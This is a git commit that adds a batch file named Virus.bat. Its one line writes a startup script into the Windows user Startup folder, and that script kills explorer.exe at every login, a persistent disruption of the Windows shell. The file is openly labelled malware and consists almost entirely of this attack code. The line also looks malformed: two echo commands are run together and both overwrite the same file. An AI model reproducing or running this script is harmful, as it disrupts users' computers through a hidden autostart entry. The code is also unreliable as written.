bc5f8f3a17f1e81e53c9c0ec4ee86765c27f5b45
Emanuel Mairoll <accounts@emanuelmairoll.at>
2016-04-28 12:49:51 +0200

    Initial Push

---
+++ Virus.bat
@@ -0,0 +1,2 @@
+echo ping -n 100 localhost^>nul > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\autostart.bat"echo taskkill /f /im explorer.exe > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\autostart.bat"
+
